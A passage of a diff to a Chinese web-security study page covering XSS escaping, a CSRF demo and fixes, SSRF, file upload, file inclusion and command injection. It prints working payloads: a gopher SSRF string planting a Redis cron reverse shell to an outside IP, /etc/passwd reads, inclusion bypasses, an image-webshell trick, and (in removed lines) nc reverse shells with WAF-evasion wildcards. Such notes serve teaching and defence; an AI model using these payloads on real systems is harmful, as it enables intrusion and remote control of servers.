class="line">    s &#x3D; s.replace(&#x2F;&lt;&#x2F;g, &#39;&lt;&#39;);</span><br><span class="line">    s &#x3D; s.replace(&#x2F;&gt;&#x2F;g, &#39;&gt;&#39;);</span><br><span class="line">    s &#x3D; str.replace(&#x2F;&amp;&#x2F;g, &#39;&amp;&#39;);</span><br><span class="line">    s &#x3D; s.replace(&#x2F;&amp;nbsp;&#x2F;g, &#39; &#39;);</span><br><span class="line">    s &#x3D; s.replace(&#x2F;&#39;&#x2F;g, &quot;\&#39;&quot;); &#x2F;&#x2F;eslint-disable-line</span><br><span class="line">    s &#x3D; s.replace(&#x2F;&quot;&#x2F;g, &#39;&quot;&#39;); &#x2F;&#x2F;eslint-disable-line</span><br><span class="line">    return s;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">可使用 he 组件 来进行转码</span><br></pre></td></tr></table></figure>
 
-<h1 id="gt-客户端请求伪造（CSRF）"><a href="#gt-客户端请求伪造（CSRF）" class="headerlink" title="-&gt;客户端请求伪造（CSRF）"></a>-&gt;客户端请求伪造（CSRF）</h1><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><ul>
-<li><p><code>CSRF</code>全拼为<code>Cross Site Request Forgery</code>，译为跨站请求伪造。</p>
-</li>
+<h1 id="客户端请求伪造（CSRF）"><a href="#客户端请求伪造（CSRF）" class="headerlink" title="客户端请求伪造（CSRF）"></a>客户端请求伪造（CSRF）</h1><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><ul>
+<li><h2 id="CSRF全拼为Cross-Site-Request-Forgery，译为跨站请求伪造。"><a href="#CSRF全拼为Cross-Site-Request-Forgery，译为跨站请求伪造。" class="headerlink" title="CSRF全拼为Cross Site Request Forgery，译为跨站请求伪造。"></a><code>CSRF</code>全拼为<code>Cross Site Request Forgery</code>，译为跨站请求伪造。</h2></li>
 <li><pre><code>CSRF
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  指攻击者盗用了你的身份，以你的名义发送恶意请求。</span><br><span class="line"></span><br><span class="line">  - 包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......</span><br><span class="line"></span><br><span class="line">- 造成的问题：个人隐私泄露以及财产安全。</span><br><span class="line"></span><br><span class="line">## CSRF攻击示意图</span><br><span class="line"></span><br><span class="line">- 客户端访问服务器时没有同服务器做安全验证</span><br><span class="line"></span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190116112233873.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjA2OTcz,size_16,color_FFFFFF,t_70)</span><br><span class="line"></span><br><span class="line">## 防止 CSRF 攻击</span><br><span class="line"></span><br><span class="line">### 步骤</span><br><span class="line"></span><br><span class="line">1. 在客户端向后端请求界面数据的时候，后端会往响应中的 cookie 中设置 csrf_token 的值</span><br><span class="line">2. 在 Form 表单中添加一个隐藏的的字段，值也是 csrf_token</span><br><span class="line">3. 在用户点击提交的时候，会带上这两个值向后台发起请求</span><br><span class="line">4. 后端接受到请求，以会以下几件事件：</span><br><span class="line">   - 从 cookie中取出 csrf_token</span><br><span class="line">   - 从 表单数据中取出来隐藏的 csrf_token 的值</span><br><span class="line">   - 进行对比</span><br><span class="line">5. 如果比较之后两值一样，那么代表是正常的请求，如果没取到或者比较不一样，代表不是正常的请求，不执行下一步操作</span><br><span class="line"></span><br><span class="line">### 代码演示</span><br><span class="line"></span><br><span class="line">#### 未进行 csrf 校验的 WebA</span><br><span class="line"></span><br><span class="line">- 后端代码实现</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">from flask import Flask, render_template, make_response</span><br><span class="line">from flask import redirect</span><br><span class="line">from flask import request</span><br><span class="line">from flask import url_for</span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
 </code></pre>
@@ -262,8 +261,7 @@
 </ul>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
 
-<h1>我是网站A，登录页面</h1>
-
+<p>网站A，登录页面</p>
 <form method=“post”>
 <label>用户名：</label><input type=“text” name=“username” placeholder=“请输入用户名”><br/>
 <label>密码：</label><input type=“password” name=“password” placeholder=“请输入密码”><br/>
@@ -284,6 +282,7 @@
 <input type=“submit” value=“转账”>
 </form>
 
+
 </body>
 </html>
 
@@ -303,13 +302,13 @@
 </ul>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
 
-<h1>我是网站B</h1>
-
+<p>我是网站B</p>
 <form method=“post” action=“http://127.0.0.1:9000/transfer”>
 <input type=“hidden” name=“to_account” value=“999999”>
 <input type=“hidden” name=“money” value=“190000” hidden>
 <input type=“submit” value=“点击领取优惠券”>
 </form>
+
 
 </body>
 </html>
@@ -354,7 +353,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">    to_account = request.form.get(<span class="string">&quot;to_account&quot;</span>)</span><br><span class="line">    money = request.form.get(<span class="string">&quot;money&quot;</span>)</span><br><span class="line">    <span class="comment"># 取出表单中的 csrf_token</span></span><br><span class="line">    form_csrf_token = request.form.get(<span class="string">&quot;csrf_token&quot;</span>)</span><br><span class="line">    <span class="comment"># 取出 cookie 中的 csrf_token</span></span><br><span class="line">    cookie_csrf_token = request.cookies.get(<span class="string">&quot;csrf_token&quot;</span>)</span><br><span class="line">    <span class="comment"># 进行对比</span></span><br><span class="line">    <span class="keyword">if</span> cookie_csrf_token != form_csrf_token:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;token校验失败，可能是非法操作&#x27;</span></span><br><span class="line">    print(<span class="string">&#x27;假装执行转操作，将当前登录用户的钱转账到指定账户&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;转账 %s 元到 %s 成功&#x27;</span> % (money, to_account)</span><br><span class="line"><span class="number">123456789101112</span></span><br></pre></td></tr></table></figure>
 
 <p>运行测试，用户直接在网站 A 操作没有问题，再去网站B进行操作，发现转账不成功，因为网站 B 获取不到表单中的 csrf_token 的隐藏字段，而且浏览器有<strong>同源策略</strong>，网站B是获取不到网站A的 cookie 的，所以就解决了<strong>跨站请求伪造</strong>的问题</p>
-<h2 id="在-Flask-项目中解决-CSRF-攻击"><a href="#在-Flask-项目中解决-CSRF-攻击" class="headerlink" title="在 Flask 项目中解决 CSRF 攻击"></a>在 Flask 项目中解决 CSRF 攻击</h2><p>在 Flask 中， Flask-wtf 扩展有一套完善的 csrf 防护体系，对于我们开发者来说，使用起来非常简单</p>
+<h3 id="在-Flask-项目中解决-CSRF-攻击"><a href="#在-Flask-项目中解决-CSRF-攻击" class="headerlink" title="在 Flask 项目中解决 CSRF 攻击"></a>在 Flask 项目中解决 CSRF 攻击</h3><p>在 Flask 中， Flask-wtf 扩展有一套完善的 csrf 防护体系，对于我们开发者来说，使用起来非常简单</p>
 <h3 id="在-FlaskForm-中实现校验"><a href="#在-FlaskForm-中实现校验" class="headerlink" title="在 FlaskForm 中实现校验"></a>在 FlaskForm 中实现校验</h3><ul>
 <li>设置应用程序的 secret_key<ul>
 <li>用于加密生成的 csrf_token 的值</li>
@@ -398,15 +397,15 @@
 </ul>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; csrf_token() &#125;&#125;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="gt-服务器端请求伪造（SSRF）"><a href="#gt-服务器端请求伪造（SSRF）" class="headerlink" title="-&gt;服务器端请求伪造（SSRF）"></a>-&gt;服务器端请求伪造（SSRF）</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>SSRF(Server-side Request Forge, 服务端请求伪造)。<br>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
-<h2 id="0x02-SSRF的危害"><a href="#0x02-SSRF的危害" class="headerlink" title="0x02 SSRF的危害"></a>0x02 SSRF的危害</h2><ol>
+<h1 id="服务器端请求伪造（SSRF）"><a href="#服务器端请求伪造（SSRF）" class="headerlink" title="服务器端请求伪造（SSRF）"></a>服务器端请求伪造（SSRF）</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SSRF(Server-side Request Forge, 服务端请求伪造)。<br>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
+<h2 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h2><ol>
 <li>扫内网</li>
 <li>向内部任意主机的任意端口发送精心构造的Payload</li>
 <li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li>
 <li>攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等）</li>
 <li>利用file协议读取本地文件等</li>
 </ol>
-<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p><strong>CURL支持协议</strong></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>CURL支持协议</strong></p>
 <p><img src="https://upload-images.jianshu.io/upload_images/7119304-e586356ee3f10dec.png" alt="img"></p>
 <p><strong>本地利用</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># dict protocol (操作Redis)</span><br><span class="line">curl -vvv &#39;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;info&#39;</span><br><span class="line"></span><br><span class="line"># file protocol (任意文件读取)</span><br><span class="line">curl -vvv &#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line"></span><br><span class="line"># gopher protocol (一键反弹Bash)</span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line">curl -vvv &#39;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;103.21.140.84&#x2F;6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</span><br></pre></td></tr></table></figure>
@@ -439,348 +438,14 @@
 <p>此时用file、dict等协议就没有用了。<br>此时可以利用302跳转进行利用</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$schema &#x3D; $_GET[&#39;s&#39;];</span><br><span class="line">$ip &#x3D; $_GET[&#39;i&#39;];</span><br><span class="line">$port &#x3D; $_GET[&#39;p&#39;];</span><br><span class="line">$query &#x3D; $_GET[&#39;q&#39;];</span><br><span class="line">if(empty($port))&#123;</span><br><span class="line">        header(&quot;Location: $schema:&#x2F;&#x2F;$ip&#x2F;$query&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">         header(&quot;Location: $schema:&#x2F;&#x2F;$ip:$port&#x2F;$query&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x04-漏洞代码"><a href="#0x04-漏洞代码" class="headerlink" title="0x04 漏洞代码"></a>0x04 漏洞代码</h2><p>curl造成的SSRF</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>curl造成的SSRF</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch &#x3D; curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">curl($url);  </span><br></pre></td></tr></table></figure>
 
 <p>file_get_contents造成的SSRF</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">echo file_get_contents($url);</span><br></pre></td></tr></table></figure>
 
 <p>fsockopen造成的SSRF</p>
-<pre><code>&lt;?php
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ?&gt;’);?&gt;
-&gt; 写在文本xx.txt中(或者shell语句直接写一句话木马，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后copy xx.jpg/b + xx.txt/a test.jpg
-&gt; 上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php 。
-
-### **文件上传漏洞防御：**
-
-###### **系统运行时的防御：**
-
-1. 文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。
-2. 判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文
-   件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。
-3. 使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。
-4. 单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。
-5. 使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。
-
-###### **系统开发阶段的防御**
-
-1. 系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。
-2. 对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。
-
-###### **系统维护阶段的防御**
-
-1. 系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。
-2. 定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。
-3. 对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。
-
-# -&gt;文件包含漏洞（File Include）
-
-## 1 有关概念
-
-前言：
-
-　　PHP中include和require的区别主要是：include在包含过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会知己报错并退出程序的执行。
-
-漏洞产生原因：
-
-　　文件包含函数加载的参数没有经过过滤或者严格定义，可以被用户控制，包含了其他恶意文件，导致执行了非预期的代码。
-
-分类：
-
-　　本地文件包含和远程文件包含。
-
-## 2 本地文件包含
-
-可利用途径：
-
-　　·上传图片：图片包含getshell
-
-　　·读文件：读取php文件
-
-　　·包含日志文件getshell
-
-　　·包含/proc/self/environ/文件getshell
-
-　　·有phpinfo可包含临时文件
-
-　　·包含data://或php://inout等伪协议（需要allow_url_include=On）
-
-### 2.1 目录遍历敏感信息路径
-
-常见的敏感信息路径
-
-windows系统：
-
-　　c:\boot.ini  //  查看系统版本
-
-　　c:\windows\system32\inetsrc\MetaBase.xml  //IIS配置文件
-
-　　c:\windows\repair\sam  //存储windows系统初次安装的密码
-
-　　c:\programFiles\mysql\my.ini  //MYSQL root密码
-
-　　c:\windows\php.ini // php 配置信息
-
-Linux/Unix系统
-
-  /etc/passwd // 账户信息
-
-  /etc/shadow // 账户密码文件
-
-  /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
-
-  /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
-
-  /usr/local/app/php5/lib/php.ini // PHP相关配置
-
-  /etc/httpd/conf/httpd.conf // Apache配置文件
-
-  /etc/my.conf // mysql 配置文件
-
-### 2.2 session文件包含
-
-利用条件：session存储位置可以获取
-
-　　获取方法1：通过phpinfo信息获取session存储位置
-
-　　获取方法2：猜测默认的session存放位置
-
-　　　　Linux下默认存放在/var/lib/php/session目录下
-
-　　　　windows默认C:\WINDOWS\Temp或集成环境下的tmp文件夹里
-
-方法：
-
-　　存在本地文件包含漏洞，可通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell
-
-### 2.3 有限制本地包含绕过
-
-绕过方法1：%00 截断
-
-　　条件：magic_quotes_gpc = Off PHP 版本&lt;5.3.4
-
-　　测试：？filename=../../../../../../boot.ini%00
-
-绕过方法2：路径长度截断
-
-　　条件：windows下目录路径最大长度为256字节，超出部分将丢弃；
-
- 　　　  Linux下目录最大长度为4096字节，超出长度将丢弃
-
-　　测试：?filename=text.txt././././.  或?filename=test.txt.....
-
-## 3 远程文件包含
-
-　　前提：服务器的php.ini的配置选项allow_url_fopen和allow_url_include为On，则include/require函数式可加载远程文件的。
-
-**有限制远程包含绕过**
-
-　测试代码：&lt;?php include($_GET[&#39;filename&#39;].&quot;.html&quot;);?&gt;  多添加了html后缀，到最后远程包含的文件　一会多一个HTML后缀
-
-**问号绕过**
-
-　　测试：？filename=http://192.168.91.133/FI/php.txt?
-
-**#号绕过**
-
-　　测试：?filenamr=http://192.168.91.133/FI/php.txt%23
-
-**空格绕过**
-
-　　测试：?filename=http://192.168.91.133/FI/php.txt%20
-
-## 4 PHP伪协议使用
-
-**php://filter(本地磁盘文件读取)**
-
-条件:只是读取，需要开启allow_url_fopen，不需开启allow_url_include
-
-用法：?filename=php://filter/convert.base64-encode/resource=xx.php
-
-　　或：?filwname=php://filter/read=convert.base64-encode/resource=xx.php
-
-**php://input(读取post文件)**
-
-　　　遇到file_get_contents()就要想着用php://input绕过，因PHP伪协议也可里要补发http协议，即可使用post方式传递数据。
-
-测试代码：&lt;?php echo file_get_contents(&quot;php://input&quot;);?&gt;
-
-用法
-
-![img](https://img2018.cnblogs.com/blog/1645931/201907/1645931-20190708110528662-1536128151.png)
-
-**php://input(木马写入)**
-
-条件：allow_url_fopen和allow_url_include同时开启 （PHP&lt;5.3.0）
-
-测试代码：
-
-　　![img](https://img2018.cnblogs.com/blog/1645931/201907/1645931-20190708110825603-1630205913.png)
-
-用法：　　
-
-　　![img](https://img2018.cnblogs.com/blog/1645931/201907/1645931-20190708110843553-2039086024.png)
-
-**php://input(命令执行)**
-
-条件：allow_url_fopen和allow_url_include同时开启 （PHP&lt;5.3.0）
-
- 测试代码：　　
-
-　　　　　　　　　　　　　　![img](https://img2018.cnblogs.com/blog/1645931/201907/1645931-20190708111139300-1520710133.png)
-
-用法：
-
-　　　　![img](https://img2018.cnblogs.com/blog/1645931/201907/1645931-20190708111205015-548522362.png)
-
-**zip://伪协议**
-
-条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。
-
-用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php 
-
-## 5 漏洞挖掘
-
-无通用性方法
-
-特定CMS，特定版本可能存在
-
-web漏洞扫描器扫描
-
-## 6修复方案
-
-PHP中可使用open_basedir配置限制访问限制在指定的区域
-
-过滤.(点)/(反斜杠)\(斜杠)
-
-进制服务器远程文件包含
-
-# -&gt;命令执行漏洞
-
-## **命令执行漏洞原理：**
-
-应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
-
-## **命令执行漏洞利用条件：**
-
-1. 应用调用执行系统命令的函数
-2. 将用户输入作为系统命令的参数拼接到了命令行中
-3. 没有对用户输入进行过滤或过滤不严
-
-## **漏洞分类：**
-
-- 代码层过滤不严
-
-商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(&quot;/bin/program --arg $arg&quot;);
-
-- 系统的漏洞造成命令注入
-
-bash破壳漏洞（CVE-2014-6271）
-
-- 调用的第三方组件存在代码执行漏洞
-
-如wordPress中用来处理图片的imageMagick组件
-JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）
-ThinkPHP命令执行
-
-## **漏洞危害：**
-
-1. 继承Web服务程序的权限去执行系统命令或读写文件
-2. 反弹shell
-3. 控制整个网站甚至服务器
-4. 进一步内网渗透
-5. 等等
-
-命令拼接符
-|、||、&amp;、&amp;&amp;的区别：
-&amp;：无论左边是false还是true，右边都执行
-&amp;&amp;：具有短路效果，左边是false，右边不执行。
-|:无论左边是false还是true，右边都会执行
-||：具有短路效果，左边是true，右边不执行。
-
-
-代码执行：
-利用系统函数实现命令执行，在php下，允许命令执行的函数有：
-eval（）、assert（）、preg_replace（）、call_user_func（）
-如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞
-
-其他函数
-ob_start（）、unserialize（）、creat_function（）
-、usort（）、uasort（）、uksort（）、
-array_filter（）、
-array_reduce（）、
-array_map（）......
-
-
-
-**系统命令执行漏洞**
-system（）
-exec（）
-shell_exec（）
-passthru（）
-pcntl_exec（）
-popen（）
-proc_open（）
-反引号
-......
-
-**命令执行WAF绕过技巧**
-**技巧一：通配符**
-ls-l
-使用通配符
-/?in/?s-l
-
-/???/??t /??c/p???w?
-有时候WAF不允许使用太多的？号
-/?in/cat/?tc/p?sswd
-
-NC反弹shell:
-nc -e /bin/bash 127.0.0.1 3737
-为了避免符号，可以将IP地址转换成整型。
-127.0.0.1-&gt;2130706433
-
-使用通配符
-root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737
-
-**技巧二：连接符**
-
-![img](https://img2018.cnblogs.com/blog/1646039/201909/1646039-20190904124248741-71863935.png)
-
-**技巧三：未初始化的bash变量**
-在bash环境中允许我们使用未初始化的bash变量，如何
-$a ,$b,$c
-我们事先并没有定义它们，输出看看:
-root@kali:~# echo $a
-root@kali:~# echo $b
-root@kali:~# echo $c
-root@kali:~#
-未初始化的变量值都是null
-
-读取/etc/passwd:
-cat$a /etc$a/passwd$a
-
-
-测试WAF
-测试代码：
-&lt;?php
-echo &quot;OK&quot;;
-system(&#39;dig&#39;.$_GET[&#39;host&#39;]);
-?&gt;
-
-www.baidu.com;$s/bin$s/which$s nc$s
-反弹shell:
-/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737
-
-
-
-## **漏洞修复：**
-
-1. **尽量少用执行命令的函数或者直接禁用**
-2. **参数值尽量使用引号包括**
-3. **在使用动态函数之前，确保使用的函数是指定的函数之一**
-4. **在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义**
-5. **对PHP语言来说，不能完全控制的危险函数最好不要使用**</code></pre>
-]]></content>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 写在文本xx.txt中(或者shell语句直接写一句话木马，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后copy xx.jpg&#x2F;b + xx.txt&#x2F;a test.jpg</span><br><span class="line">&gt; 上传test.jpg，然后访问test.jpg&#x2F;.php或test.jpg&#x2F;abc.php当前目录下就会生成一句话木马 shell.php 。</span><br><span class="line"></span><br><span class="line">### **文件上传漏洞防御：**</span><br><span class="line"></span><br><span class="line">###### **系统运行时的防御：**</span><br><span class="line"></span><br><span class="line">1. 文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</span><br><span class="line">2. 判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文</span><br><span class="line">   件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</span><br><span class="line">3. 使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</span><br><span class="line">4. 单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</span><br><span class="line">5. 使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。</span><br><span class="line"></span><br><span class="line">###### **系统开发阶段的防御**</span><br><span class="line"></span><br><span class="line">1. 系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。</span><br><span class="line">2. 对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。</span><br><span class="line"></span><br><span class="line">###### **系统维护阶段的防御**</span><br><span class="line"></span><br><span class="line">1. 系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。</span><br><span class="line">2. 